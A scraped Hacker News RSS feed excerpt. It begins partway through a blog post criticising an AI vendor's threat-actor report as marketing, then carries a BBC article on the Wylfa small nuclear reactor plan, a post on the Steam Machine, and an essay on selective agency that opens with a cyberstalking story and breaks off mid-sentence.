It‚Äôs irresponsible at best to accuse other countries of serious things without backing it up. Yes, I am aware that Chinese-linked APTs are out there and very aggressive, and Yes, I am aware that
Threat Actors misuse LLMs all the time, but that is besides the point. We need fact-based evidence. We need to be able to verify all this. Otherwise, anyone can say anything, on the premise that it‚Äôs
probably happening. But that‚Äôs not good enough.</p>
<p>So if the report does not give any details on TTPs and detections, what was the purpose of this report exactly ?</p>
<p>There is a paragraph at the end that seem to give us a clue:</p>
<blockquote>
<p>The cybersecurity community needs to assume a fundamental change has occurred: Security teams should experiment with applying AI for defense in areas like SOC automation, threat detection, vulnerability assessment, and incident response and build experience with what works in their specific environments.</p>
</blockquote>
<p>‚ÄúSecurity teams should experiment with applying AI for defense‚Äù</p>
<p>‚Ä¶</p>
<p>Hmm. But who sells this kind of AI they‚Äôre talking about here ?</p>
<p>At the end of the day, this shit is a pathetic excuse of a report and should not be taken as anything else than a shameless attempt at selling more of their product.
This is shameful and extremely unprofessional, at best. This disregard for basics ethics in order to sell just a little bit more make me want to never use their product, ever.</p>
<p>Do better.</p>

    </div>
    

            </section>

            <section>
                <div>
    
<h2>djnn.sh</h2>
<p>offensive security &amp; software engineering</p>
</div>
                <hr>
                <div>
    <p>all thoughts are mine and mine only, yadi yadi yada...</p>
    
        <p>
            
            2025-11-16
        </p>
    

    

                </div>
            </section>

            

        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[UK's first small nuclear power station to be built in north Wales (151 pts)]]></title>
            <link>https://www.bbc.com/news/articles/c051y3d7myzo</link>
            <guid>45944056</guid>
            <pubDate>Sun, 16 Nov 2025 10:38:41 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.bbc.com/news/articles/c051y3d7myzo">https://www.bbc.com/news/articles/c051y3d7myzo</a>, See on <a href="https://news.ycombinator.com/item?id=45944056">Hacker News</a></p>
<div id="readability-page-1" class="page"><article><p data-component="headline-block"><h2>UK's first small nuclear power station to be built in north Wales </h2></p><div data-testid="byline-new" data-component="byline-block"><p><span data-testid="byline-new-contributors"><p><span>Gareth Lewis,</span><span data-testid="byline-new-contributors-contributor-0-role-location">Wales political editor</span><span> and </span></p><p><span>Steffan Messenger,</span><span data-testid="byline-new-contributors-contributor-1-role-location">Wales environment correspondent</span></p></span></p></div><figure><div data-component="image-block"><p><img src="https://static.files.bbci.co.uk/bbcdotcom/web/20251110-152207-94080fba49-web-2.33.2-3/grey-placeholder.png" aria-label="image unavailable"><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/0f77/live/492b9290-c07e-11f0-ae46-bd64331f0fd4.jpg.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/0f77/live/492b9290-c07e-11f0-ae46-bd64331f0fd4.jpg.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/0f77/live/492b9290-c07e-11f0-ae46-bd64331f0fd4.jpg.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/0f77/live/492b9290-c07e-11f0-ae46-bd64331f0fd4.jpg.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/0f77/live/492b9290-c07e-11f0-ae46-bd64331f0fd4.jpg.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/0f77/live/492b9290-c07e-11f0-ae46-bd64331f0fd4.jpg.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/0f77/live/492b9290-c07e-11f0-ae46-bd64331f0fd4.jpg.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/0f77/live/492b9290-c07e-11f0-ae46-bd64331f0fd4.jpg.webp" loading="eager" alt="Getty Images The Wylfa site, taken from a road with part of the tarmac visible as well as hedges and grass."><span>Getty Images</span></p></div><p data-component="caption-block"><figcaption>Work will begin next year at the Wylfa site (pictured above), with the aim of generating power by the mid 2030s</figcaption></p></figure><div data-component="text-block"><p>A first-of-its-kind nuclear power station is to be built on Anglesey, bringing up to 3,000 jobs and billions of pounds of investment.</p><p>The plant at Wylfa, on the Welsh island's northern coast, will have the UK's first three small modular reactors (SMR), although the site could potentially hold up to eight.</p><p>Work is due to start next year with the aim of generating power by the mid 2030s.</p><p>Prime Minister Sir Keir Starmer said Britain was once a world leader in nuclear power but "years of neglect and inertia has meant places like Anglesey have been let down and left behind. Today, that changes."</p></div><div data-component="text-block"><p>The project, which could power about three million homes, will be built by publicly owned Great British Energy-Nuclear and is backed by a ¬£2.5bn investment from the UK government.</p><p>Visiting a further education college in north Wales on Thursday, Sir Keir said the development would bring jobs for "decades to come" and that work would begin "virtually straight away".</p><p>Wales' First Minister Eluned Morgan, who said she had been "pressing the case at every opportunity for Wylfa's incredible benefits".</p><p><a target="_self" href="https://www.bbc.co.uk/news/articles/c62614wejk5o">SMRs work similarly to large reactors</a>, using a nuclear reaction to generate heat that produces electricity - but are a fraction of the size, with about a third of the generating output.</p><p>Ed Miliband, Secretary of State for Energy and Climate Change, called the announcement "exciting" and said Britain is in the race for new reactors.</p><p>Speaking on <a target="_self" href="https://www.bbc.co.uk/programmes/m002ly09">BBC Radio Wales Breakfast</a>, Miliband added they hope to "work with local colleges to make sure that there are local skills providers, skills training opportunities, so local people get these jobs".</p></div><figure><div data-component="image-block"><p><img src="https://static.files.bbci.co.uk/bbcdotcom/web/20251110-152207-94080fba49-web-2.33.2-3/grey-placeholder.png" aria-label="image unavailable"><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/4a94/live/4f832c80-c087-11f0-924c-87dcfe4462ba.jpg.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/4a94/live/4f832c80-c087-11f0-924c-87dcfe4462ba.jpg.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/4a94/live/4f832c80-c087-11f0-924c-87dcfe4462ba.jpg.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/4a94/live/4f832c80-c087-11f0-924c-87dcfe4462ba.jpg.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/4a94/live/4f832c80-c087-11f0-924c-87dcfe4462ba.jpg.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/4a94/live/4f832c80-c087-11f0-924c-87dcfe4462ba.jpg.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/4a94/live/4f832c80-c087-11f0-924c-87dcfe4462ba.jpg.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/4a94/live/4f832c80-c087-11f0-924c-87dcfe4462ba.jpg.webp" loading="lazy" alt="Rolls-Royce An computer generated artists impression of the what the site will look like. A silver building surrounded by green area, trees and a car park which sits in front of it. "><span>Rolls-Royce</span></p></div></figure><div data-component="text-block"><p>Simon Bowen, chair of Great British Energy-Nuclear, hailed an "historic moment for the UK".</p><p>Llinos Medi, the MP for Ynys M√¥n, the Welsh name for Anglesey, said it was a "game-changer" for the area "but only if local people see real and lasting benefits".</p><p>Mims Davies MP, the Shadow Secretary of State for Wales, said it will bring much-needed jobs and investment but "the current plan will only generate a fraction of the power that a Gigawatt-powered plant would".</p><p>Anthony Slaughter, leader of Wales Green Party, said the project was "an expensive distraction from the clean, fast and cheap renewables already available to us". </p><p>He added "a fast, ambitious roll-out of solar, wind and wave energy that will create jobs and cut energy bills" was needed. </p><p>The Federation of Small Businesses (FSB) Wales said the plant would bring a "once in a generation" boost for jobs, supply chains and regional infrastructure.</p></div><div data-component="text-block"><p>Great British Energy-Nuclear has also been tasked with identifying potential sites across the UK for another large-scale nuclear power plant, similar to those being built at Hinkley Point in Somerset and Sizewell in Suffolk, which can power the equivalent of six million homes.</p><p>The company will report back by autumn 2026, officials said.</p><p>It is not clear whether the SMR plans, which are smaller and more straightforward to build, rule Wylfa out after it was designated the preferred location in 2024 by the previous UK Conservative government.</p></div><figure><div data-component="image-block"><p><img src="https://static.files.bbci.co.uk/bbcdotcom/web/20251110-152207-94080fba49-web-2.33.2-3/grey-placeholder.png" aria-label="image unavailable"><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/3e3c/live/80b115b0-c06e-11f0-8669-5560f5c90fbe.png.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/3e3c/live/80b115b0-c06e-11f0-8669-5560f5c90fbe.png.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/3e3c/live/80b115b0-c06e-11f0-8669-5560f5c90fbe.png.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/3e3c/live/80b115b0-c06e-11f0-8669-5560f5c90fbe.png.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/3e3c/live/80b115b0-c06e-11f0-8669-5560f5c90fbe.png.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/3e3c/live/80b115b0-c06e-11f0-8669-5560f5c90fbe.png.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/3e3c/live/80b115b0-c06e-11f0-8669-5560f5c90fbe.png.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/3e3c/live/80b115b0-c06e-11f0-8669-5560f5c90fbe.png.webp" loading="lazy" alt="Map showing the location of nuclear power stations in the UK. The operational reactors are: Torness on the east coast of Scotland, Hartlepool, Sizewell and the Heysham 1 and 2 reactors. Three reactors are being defuelled: Hunterston on the west coast of Scotland, Hinkley Point and Dungeness. The map shows the location of the newly-announced reactor at Wylfa on the north coast of Wales."></p></div></figure><p data-component="subheadline-block"><h2>'Nuclear equivalent of an Ikea chair'</h2></p><div data-component="text-block"><p>Prof Simon Middleburgh, director of the Nuclear Futures Institute at Bangor University, said the SMRs would be "built in a modular manner in factories and shipped to the site to be put together a bit like an Ikea chair".</p><p>There were "a few more hurdles to go through", he cautioned - from securing regulatory approval, building the factories required to construct the SMRs and training the workforce that will run them.</p><p>Opponents of the project point to the fact that a long-term storage facility for the UK's nuclear waste is yet to be agreed upon and say investment in renewable energy schemes - wind, wave and tidal - is what Anglesey needs.</p><p>Dylan Morgan, of the People Against Wylfa-B campaign group, said the proposed SMRs were "an unnecessarily big development of an unproven technology".</p><p>The government sees them as a secure, reliable, affordable and low carbon energy system and is convinced that, with investment, SMRs will create thousands of jobs and boost manufacturing.</p><p>Wylfa beat competition from a site at Oldbury in Gloucestershire, with the reactors designed by Rolls-Royce, subject to final contracts, which are expected later this year.</p></div><figure><div data-component="image-block"><p><img src="https://static.files.bbci.co.uk/bbcdotcom/web/20251110-152207-94080fba49-web-2.33.2-3/grey-placeholder.png" aria-label="image unavailable"><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/1c60/live/23c98650-c0a2-11f0-b2d5-133186eb0524.jpg.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/1c60/live/23c98650-c0a2-11f0-b2d5-133186eb0524.jpg.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/1c60/live/23c98650-c0a2-11f0-b2d5-133186eb0524.jpg.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/1c60/live/23c98650-c0a2-11f0-b2d5-133186eb0524.jpg.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/1c60/live/23c98650-c0a2-11f0-b2d5-133186eb0524.jpg.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/1c60/live/23c98650-c0a2-11f0-b2d5-133186eb0524.jpg.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/1c60/live/23c98650-c0a2-11f0-b2d5-133186eb0524.jpg.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/1c60/live/23c98650-c0a2-11f0-b2d5-133186eb0524.jpg.webp" loading="lazy" alt="PA Media Energy Secretary Ed Milliband, Chancellor of the Exchequer Rachel Reeves, Simon Bowen, Interim Chair for Great British Energy - Nuclear (GBE-N), Prime Minister Sir Keir Starmer, First Minister of Wales Eluned Morgan and Science and Technology Secretary Liz Kendall look at maps of the Wylfa plant during a visit to an engineering workshop at Coleg Menai in Anglesey. The UK's first small modular reactor (SMR) nuclear power station will be built at Wylfa in North Wales by publicly owned Great British Energy-Nuclear and is backed by ¬£2.5 billion investment from the Government. "><span>PA Media</span></p></div><p data-component="caption-block"><figcaption>Ministers saw maps of the Wylfa plant during a visit to Coleg Menai on Anglesey</figcaption></p></figure><div data-component="text-block"><p>The UK government said the plant would help provide energy independence.</p><p>The decision to opt for small modular reactors at Wylfa was criticised by the US ambassador Warren Stephens, who said he was "extremely disappointed".</p><p>He had urged ministers to commit to a large-scale plant, with US firm Westinghouse having reportedly presented plans for a new gigawatt station at the site.</p><p>Downing Street said the decision to build the power station in Wales "doesn't close the door" to a US manufacturer working on a future project.</p></div><figure><div data-component="image-block"><p><img src="https://static.files.bbci.co.uk/bbcdotcom/web/20251110-152207-94080fba49-web-2.33.2-3/grey-placeholder.png" aria-label="image unavailable"><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/865e/live/60898420-c05a-11f0-ae46-bd64331f0fd4.png.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/865e/live/60898420-c05a-11f0-ae46-bd64331f0fd4.png.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/865e/live/60898420-c05a-11f0-ae46-bd64331f0fd4.png.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/865e/live/60898420-c05a-11f0-ae46-bd64331f0fd4.png.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/865e/live/60898420-c05a-11f0-ae46-bd64331f0fd4.png.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/865e/live/60898420-c05a-11f0-ae46-bd64331f0fd4.png.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/865e/live/60898420-c05a-11f0-ae46-bd64331f0fd4.png.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/865e/live/60898420-c05a-11f0-ae46-bd64331f0fd4.png.webp" loading="lazy" alt="Graphic showing the difference between SMRs and large nuclear reactors"></p></div></figure><div data-component="text-block"><p>The old nuclear power plant at Wylfa was switched off in 2015 and previous plans for a large-scale replacement fell through in 2021.</p><p>The company behind the scheme ‚Äì the Japanese industrial giant Hitachi - cited spiralling costs and a failure to reach agreement with the UK government over funding.</p></div><div data-component="text-block"><p>There is a huge political component to the announcement, with Labour's leadership in Westminster keen to show it means business on big investment in infrastructure projects.</p><p>In Wales, the first minister has been pushing hard for Wylfa - and the announcement comes six months before the Senedd election.</p><p>Eluned Morgan has been trying to strike a balance: differentiating the Welsh party from UK Labour, while pushing for extra funding, further devolution of powers and big investment announcements from her UK colleagues.</p><p>She has certainly got the latter, although plenty of other issues such as reform to how Wales is funded and devolution of the Crown Estate ‚Äì which owns much of the Welsh coastline and is vital to future wind power ‚Äì remain unresolved.</p></div><figure><div data-component="image-block"><p><img src="https://static.files.bbci.co.uk/bbcdotcom/web/20251110-152207-94080fba49-web-2.33.2-3/grey-placeholder.png" aria-label="image unavailable"><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/28dd/live/ab78e300-c06d-11f0-8669-5560f5c90fbe.png.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/28dd/live/ab78e300-c06d-11f0-8669-5560f5c90fbe.png.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/28dd/live/ab78e300-c06d-11f0-8669-5560f5c90fbe.png.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/28dd/live/ab78e300-c06d-11f0-8669-5560f5c90fbe.png.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/28dd/live/ab78e300-c06d-11f0-8669-5560f5c90fbe.png.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/28dd/live/ab78e300-c06d-11f0-8669-5560f5c90fbe.png.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/28dd/live/ab78e300-c06d-11f0-8669-5560f5c90fbe.png.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/28dd/live/ab78e300-c06d-11f0-8669-5560f5c90fbe.png.webp" loading="lazy" alt="Thin, green banner promoting the Future Earth newsletter with text saying, ‚ÄúThe world‚Äôs biggest climate news in your inbox every week‚Äù. There is also a graphic of an iceberg overlaid with a green circular pattern."></p></div></figure></article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[I don‚Äôt need a Steam Machine (130 pts)]]></title>
            <link>https://brainbaking.com/post/2025/11/why-i-dont-need-a-steam-machine/</link>
            <guid>45943992</guid>
            <pubDate>Sun, 16 Nov 2025 10:21:07 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://brainbaking.com/post/2025/11/why-i-dont-need-a-steam-machine/">https://brainbaking.com/post/2025/11/why-i-dont-need-a-steam-machine/</a>, See on <a href="https://news.ycombinator.com/item?id=45943992">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>
			    <div>
			  		<p>For those of you who are living under a rock, Valve announced <a href="https://store.steampowered.com/sale/steammachine">three new hardware devices</a> joining their Steam Deck line-up: a new controller, a VR headset, and the GameCube‚Äîno wait, GabeCube‚Äîno wait, Steam Machine. The shiny little cube is undoubtedly Valve‚Äôs (second) attempt to break into the console market. This time, it might just work.</p>
<p>The hardware is ready to arrive in at your living room spring next year. The biggest question is: will it arrive at <em>our</em> living room? Reading all the hype has certainly enthused me (e.g. Brendon‚Äôs <a href="https://wavelengths.online/posts/the-steam-machine-is-the-future">The Steam Machine is the Future</a>, PC Gamer‚Äôs <a href="https://www.pcgamer.com/hardware/vr-hardware/steamos-launching-for-arm-fex-translation-layer/">Valve is all over ARM</a>, Eurogamer‚Äôs <a href="https://www.eurogamer.net/tech-steam-machine-preview-a-powerful-customisable-mini-pc-for-couch-gaming">Steam Machine preview</a>, ResetEra‚Äôs <a href="https://www.resetera.com/threads/the-steam-hardware-family-officially-expands-in-early-2026-steam-controller-steam-machine-steam-frame.1351453/">Steam Hardware thread</a>); especially the part where the Machine is just a PC that happens to be tailored towards console gaming. According to Valve, you can install anything you want on it‚Äîit‚Äôs just SteamOS just like your trusty Deck, meaning you can boot into KDE and totally do your thing. Except that this shiny little cube is six times as powerful. I‚Äôm sure Digital Foundry will validate that next year.</p>
<figure><a href="https://brainbaking.com/post/2025/11/why-i-dont-need-a-steam-machine/steam-machine.jpg">
		<img src="https://brainbaking.com/post/2025/11/why-i-dont-need-a-steam-machine/steam-machine.jpg" loading="lazy" title="Valve's newly announced Steam Machine: a mysterious looking sleek black box." data-pagefind-index-attrs="title">
	</a>
	
		<figcaption>Valve's newly announced Steam Machine: a mysterious looking sleek black box.</figcaption></figure>

<p>However, this post isn‚Äôt about specs, expectations, or dreams: it‚Äôs about tempering my own enthusiasm. I‚Äôd like to tell myself why I don‚Äôt really need a Steam Machine. The following list will hopefully make it easier to say no when the buy buttons become available.</p>
<ul>
<li><em>You‚Äôre a retro gamer.</em> <br>You don‚Äôt need the power of six Steam Decks. To do what, run DOSBox?</li>
<li><em>Your TV doesn‚Äôt support 4K</em>.<br>Again, no need for those 4K 60 FPS.</li>
<li><em>You generally dislike AAA games.</em> <br>With The Steam Machine, you might be able to finally properly run <em>DOOM Eternal</em> and all of the <em>Assassin‚Äôs Creed</em> games. That you don‚Äôt like playing.</li>
<li><em>You don‚Äôt have time to play games anyway.</em><br>Ouch, that hurts but it‚Äôs not untrue.</li>
<li><em>The TV will be occupied anyway.</em><br>The Steam Machine is not a Switch: you can‚Äôt switch to handheld mode. When are you going to play on the Machine if the TV is being used to watch your wife‚Äôs favourite shows?</li>
<li><em>You already have too many gaming related hardware pieces.</em><br>That‚Äôll mean you‚Äôll have to divide your time by an even bigger number to devote an equal amount to playing them.</li>
<li><em>There‚Äôs no room for yet another nondescript box under the TV.</em><br>See above: why don‚Äôt you first try to do something with that SNES Mini and PlayStation Mini besides letting it collect dust?</li>
<li><em>You‚Äôre a physical gamer.</em><br>This is Steam. There will be no insertion of cartridges, no blowing of carts, and no staring at game collections on a shelf.</li>
<li><em>It‚Äôs Steam, not Good Old Games.</em><br>Sure it can run GOG games but the Machine is primarily designed to run Steam. You avoid purchasing from Steam like the plague, yet you‚Äôre willing to buy a Machine dedicated to it? Are you crazy?</li>
<li><em>The last time you booted Steam was over a year ago.</em><br>Don‚Äôt tell me you‚Äôre suddenly interested in running the platform on a dedicated machine.</li>
<li><em>You don‚Äôt have time to fiddle with configuration.</em><br>Button and trackpad mappings to get the controls just right enough to play strategy games designed to be played with keyboard and mouse will only leave you frustrated.</li>
<li><em>Your MacBook can emulate Windows games just fine.</em><br>You recently bought CrossOver and played <em>Wizordum</em> and older Windows 98/XP stuff on it. It even runs <em>Against The Storm</em> flawlessly. No need for Proton or whatever.</li>
<li><em>In two years, you‚Äôll upgrade your M1 to an M4+: there‚Äôs the power upgrade.</em><br>If CrossOver is struggling to run that particular game you so badly want to play, it‚Äôll be buttery smooth in a few years. You‚Äôre going to do the laptop upgrade anyway regardless of the Steam Machine.</li>
<li><em>You already have a huge gaming backlog.</em><br>Thanks to your buddy Joel you bought too many physical Switch games that are still waiting to be touched. Are you really ready to open up another can of worms?</li>
<li><em>You dislike a digital backlog.</em><br>It‚Äôs easy to have hundreds of games on there: see your GOG purchases. Why don‚Äôt you try to count the ones that you actually played, let alone finished.</li>
<li><em>You‚Äôre not going to use the Machine to run office software.</em><br>Your laptop and other retro machines are good enough at handling that task. What are you really going to do with this cube besides gaming?</li>
<li><em>Those cool looking indie games will be released for Switch in due time anyway.</em><br>Remember <em>Pizza Tower</em>? It‚Äôs out on Switch now. Remember to buy the cart on Fangamer, together with the <em>Anton Blast</em> one.</li>
<li><em>It‚Äôs rumoured to cost more than</em> <code>‚Ç¨600</code>.<br>Save that money for a Switch 2 if the games are starting to become interesting to justify that upgrade, as currently, they‚Äôre not. Also, see the backlog point above.</li>
<li><em>All HDMI ports both on the TV and your external monitors are occupied</em>.<br>Unless you‚Äôre willing to constantly switch cables, you‚Äôll need to invest in a HDMI switch. Another <code>‚Ç¨100+</code>.</li>
<li><em>You can‚Äôt buy this without buying the Steam Controller.</em><br>That‚Äôs easily another <code>‚Ç¨80+</code> you already spent buying the Mobapad controller for your Switch as a replacement for the semi-broken Joy Cons.</li>
<li><em>You can‚Äôt buy this as an expense on the company.</em><br>You‚Äôre closing down the company, remember. (More on that later)</li>
<li><em>The cool looking LED and programmable front display don‚Äôt justify an expensive purchase.</em><br>After the initial excitement wears off, the LED will become annoying and you‚Äôll simply turn it off.</li>
</ul>
<p>So you see, I don‚Äôt really need a Steam Machine‚Ä¶</p>
<p>Fuck it, I‚Äôm getting one.</p>


		  			<p>
			        
			        	
                
                    <kbd><a href="https://brainbaking.com/categories/retro">retro</a></kbd>
                
                &nbsp;
			        
				    
				    	
					    <span>
					        
					            <kbd><a href="https://brainbaking.com/tags/steam" title="Tag: steam">steam</a></kbd>&nbsp;
					        
					            <kbd><a href="https://brainbaking.com/tags/games" title="Tag: games">games</a></kbd>&nbsp;
					        
					    </span>
					</p>
				    
			  	</div>
			</article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Maybe You're Not Actually Trying (357 pts)]]></title>
            <link>https://usefulfictions.substack.com/p/maybe-youre-not-actually-trying</link>
            <guid>45943979</guid>
            <pubDate>Sun, 16 Nov 2025 10:14:25 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://usefulfictions.substack.com/p/maybe-youre-not-actually-trying">https://usefulfictions.substack.com/p/maybe-youre-not-actually-trying</a>, See on <a href="https://news.ycombinator.com/item?id=45943979">Hacker News</a></p>
<div id="readability-page-1" class="page"><div dir="auto"><p>Two things happened for me over the holidays five years ago: I went to rehab, and I acquired a cyberstalker. These were not entirely independent events. The stalker was someone in India who‚Äôd started following me when I was playing poker, who came to believe we had a close personal relationship and that my tweets were coded messages to him. When I stopped tweeting for two months, he became convinced something had happened to me, so he tracked down my email and phone number and started spamming me with messages demanding to know where I was.</p><p>By the time I realized this was happening, he‚Äôd already escalated to the point that I was clearly never going to respond. I started blocking him on different platforms, but he‚Äôd just create another account or phone number, or find some other way in. He messaged me dozens of times a day, alternating between threats and pleas. When he reached out to my company six months later to apply for a job, I learned his real name and used it to track down an old friend of his to ask for help ‚Äî but the friend told me he was afraid to intervene because he didn‚Äôt want to become a target himself. I decided that there was nothing I could do from the other side of the world, and resigned myself to waiting him out.</p><p>Only he never tired. Years went by and I never responded, and still he messaged me multiple times a day. The messages became more disturbing, more pornographic, more violent. He told me he would come find me in Berkeley and hurt me. Finally, last November, in the span of a few days, he sent me an image of his brand new passport and a visa application, which he said he planned to use to travel here, and successfully extorted money from my brother by spoofing my phone number and pretending to have kidnapped me.</p><div data-attrs="{&quot;url&quot;:&quot;https://usefulfictions.substack.com/p/maybe-youre-not-actually-trying?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share&quot;,&quot;text&quot;:&quot;Share&quot;}" data-component-name="CaptionedButtonToDOM"><p>Thanks for reading Useful Fictions! This post is public so feel free to share it.</p><p data-attrs="{&quot;url&quot;:&quot;https://usefulfictions.substack.com/p/maybe-youre-not-actually-trying?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share&quot;,&quot;text&quot;:&quot;Share&quot;}" data-component-name="ButtonCreateButton"><a href="https://usefulfictions.substack.com/p/maybe-youre-not-actually-trying?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share" rel=""><span>Share</span></a></p></div><p><em>Enough! </em><span>I thought, and snapped into action. Except that I didn‚Äôt. Instead, I curled up in a ball and cried, and told friends who suggested contacting the police that there was no point, that no one would be able to help as long as I was here and he was in India.</span></p><p>But my husband was insistent that there had to be a better answer, and asked me to let him intervene on my behalf. In short order, he was in contact with the FBI, the US consulate in India, and, with the help of his friend Govind, who has family there, the local police where the stalker lived. Within months, the situation had resolved, and he will never set foot on American soil.</p><p>One of the interesting things about all of this is that there was nothing particularly inventive about the strategies my husband deployed. They were more or less exactly the strategies I would have come up with if I‚Äôd been put in charge of a similar situation in someone else‚Äôs life. Why did it take another person getting involved for me to realize I wasn‚Äôt Actually Trying?</p><p>I think what happened is this: When the stalker entered my life, I was at a low point in personal capacity ‚Äî broke, alone, addled, etc. My approach towards him at that point (ignore, hoping he‚Äôd stop) was the only one that seemed available given my spiritual and psychological resources at the time. But my orientation to the problem became fixed in time at that point of low agency, and it never occurred to me to revisit it as my capacity for action increased.</p><p><span>I think we are all like this. </span><strong>People are not just high-agency or low-agency in a global sense, across their entire lives. Instead, people are selectively agentic.</strong></p><p>Let‚Äôs say that life is divided up into three theaters: work, relationships with others (all kinds) and relationship to self (physical health, introspection, emotional development, all of it). I think it‚Äôs the rule, rather than the exception, that people are stuck at an earlier stage of development in at least one area. There is one theater of life where they‚Äôre not Actually Trying ‚Äî where they‚Äôre approaching serious problems with the resourcefulness of a teenager, though they are now capable adults.</p><p>In my particular corner of the world, there are tons of high-achievers in work. These are ingenious people shaping the world through innovations in science, technology, and policy. But many of them haven‚Äôt applied the same ingenuity to their interior experience or relationships. These are people who could successfully launch a product in a foreign country with little instruction, but who complain that there aren‚Äôt any fun people to meet on the dating apps.</p><p><strong>It seems like, by default, you are stuck with whatever level of resourcefulness you brought to a problem the first time you encountered it and failed to fix it.</strong></p><p>Let‚Äôs say you tried therapy when you were 20, and it didn‚Äôt help with your high levels of anxiety. When you think about your anxiety, as the years go by, you think, ‚Äúhard problem, tried the main solution, didn‚Äôt work out.‚Äù Perhaps you just accept anxiety as a fixed trait, and your friends playfully rib you about it, which is nice but makes it seem even more like a static part of your identity. But you‚Äôre not 20 anymore. You‚Äôre, say, a 32-year-old CTO, and when a vital project at your startup doesn‚Äôt respond to your first approach, you vigorously try another, and another, trying to learn from every failure. That same persistence and curiosity don‚Äôt get applied to the anxiety that makes you suffer at work, though.</p><p><span>You don‚Äôt think, </span><em>oh, I could probably</em><span>:</span></p><ul><li><p>Check on my nutrition and sleep, in a serious way</p></li><li><p>Look into supplements and medication</p></li><li><p>Throw some resources at improving my rest and recovery</p></li><li><p>Ask all of my friends about the best anxiety treatments they‚Äôve ever heard of, or the best coaches/therapists they‚Äôve ever worked with</p></li><li><p>Research any emerging therapies designed for people like me</p></li></ul><p><span>Instead of doing those things, you just put up with it. Or, worse, you fight through your anxiety using an earlier solution that required willpower, and the exertion of willpower makes you feel like you‚Äôre trying. </span><strong>But the feeling of effort doesn‚Äôt mean that you‚Äôre Actually Trying.</strong></p><p><span>There is a relevant concept from Alexander Technique that I love, ‚Äúfaulty sensory appreciation,‚Äù which I learned about from </span><a href="https://expandingawareness.org/" rel="">Michael Ashcroft</a><span>. The concept is that habitual tension distorts your sensory impressions‚Äîrigid stillness via bodily tension starts to feel like ‚Äúgood posture,‚Äù whereas relaxed uprightness feels strange, to the extent you might feel like your back is at a weird angle when you‚Äôre actually standing up tall. The right way feels like the wrong way. Apparently, this is demonstrated by having Alexander students lie in a position where your legs tell you that you shouldn‚Äôt be able to stand up ‚Äî and then the instructor says, ‚Äúby the way, you can stand up from here,‚Äù and you do.</span></p><p><span>Similarly, people who are being selectively agentic often have a kind of faulty sensory appreciation. Perhaps relationships </span><em>feel hard </em><span>for you, they take willpower, so it‚Äôs tempting to believe that you‚Äôre Actually Trying, that you‚Äôve brought the full weight of your genius to bear on the problem. You might even take some pride in the struggle. Like rigid posture, the strain feels like correctness. But struggling is not evidence that you‚Äôve tried everything. To the contrary, the continuous need for willpower may be the sign of a 